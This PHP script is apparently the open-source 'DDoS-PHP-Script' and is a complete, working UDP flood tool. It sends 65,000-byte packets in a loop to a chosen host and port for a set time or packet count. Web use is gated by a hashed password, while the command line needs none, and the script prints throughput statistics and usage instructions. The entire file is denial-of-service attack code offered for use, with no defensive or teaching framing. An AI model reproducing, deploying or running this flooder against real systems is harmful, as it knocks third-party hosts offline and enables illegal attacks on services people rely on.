<?php
$cli=false;

if(isset($argv)) {
    parse_str(implode('&', array_slice($argv, 1)), $_GET);
    $cli=true;
}

if(isset($_GET['host'])&&(isset($_GET['time'])||isset($_GET['packet']))&&(isset($_GET['pass'])||$cli==true)){
	
	// If executed from CLI no password
	if($cli==false){
		$pass = htmlspecialchars($_GET['pass'], ENT_QUOTES, 'UTF-8');
		if (md5($pass) !== "1f3870be274f6c49b3e31a0c6728957f"){ echo "Wrong password!"; exit();}
	}
	
	$packets = 0; 
	$host = htmlspecialchars($_GET['host'], ENT_QUOTES, 'UTF-8');
	
	$packet_size = 65000;
	$out = str_repeat("0", $packet_size);
	
	if(isset($_GET['time'])){
		$exec_time = htmlspecialchars($_GET['time'], ENT_QUOTES, 'UTF-8'); 
		$max_time = time()+$exec_time; 
		
		while(time() < $max_time){
				$packets++;
				$port = (isset($_GET['port']) && strlen($_GET['port']) > 0) ?  htmlspecialchars($_GET['port'], ENT_QUOTES, 'UTF-8') : rand(1,65535);
				$fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 30);
				if(!$fp){
					echo "$errstr ($errno)<br />\n";
				}else{
						if($cli){
							echo "Sending packet #".$packets."...\n";
						}
						fwrite($fp, $out);
						fclose($fp);
				}
		}
	}
	elseif(isset($_GET['packet'])){
		$max_packet = htmlspecialchars($_GET['packet'], ENT_QUOTES, 'UTF-8');
		$start_time=time();
		
		while($packets < $max_packet){
				$packets++;
				$port = (isset($_GET['port']) && strlen($_GET['port']) > 0) ?  htmlspecialchars($_GET['port'], ENT_QUOTES, 'UTF-8') : rand(1,65535);
				$fp = fsockopen('udp://'.$host, $port, $errno, $errstr, 30);
				if(!$fp){
					echo "$errstr ($errno)<br />\n";
				}else{
						if($cli){
							echo "Sending packet #".$packets."...\n";
						}
						fwrite($fp, $out);
						fclose($fp);
				}
		}
		$exec_time = time() - $start_time;
		
		// If the script end before 1 sec, all the packets were sent in 1 sec
		if($exec_time==0){$exec_time=1;}
	}
	
	if(!$cli){
		echo "<br><b>DDoS UDP Flood Vs " . $host . ":" . $port . "</b><br>Completed with $packets (" . round((($packets*$packet_size)/1024)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second<br>";
	}else{
		echo "\nDDoS UDP Flood --> " . $host . ":" . $port . "\nCompleted with $packets (" . round((($packets*$packet_size)/1024)/1024, 2) . " MB) packets averaging ". round($packets/$exec_time, 2) . " packets per second \n";
	}
}else{ 
	echo "\nMissing parameters!";
	if(!$cli){
		echo "<br><ul><li>Host parameter is always REQUIRED<li>Pass parameter is always REQUIRED<li>If you leave out the port parameter, a random port will be selected<li>You can use the time parameter (how much seconds keep the DDoS alive)<li>You can use the packet parameter (how much packets send to the target)<ul><li>If both are used, only time will be checked<li>If none is used the script will exit with \"Missing Parameters\" Error.</ul></ul><br>";
		echo "More information on <a href=\"https://github.com/drego85/DDoS-PHP-Script\" target=\"_blank\">GitHub</a>";
	}else{
		echo "\n\n* host parameter is always REQUIRED \n* If you leave out the port parameter, a random port will be selected \n* You can use the time parameter (how much seconds keep the DDoS alive) \n* You can use the packet parameter (how much packets send to the target) \n\t* If both are used, only time will be checked \n\t* If none is used the script will exit with \"Missing Parameters\" Error. \n";
		echo "\nMore information on https://github.com/drego85/DDoS-PHP-Script \n";
	}
}
?>
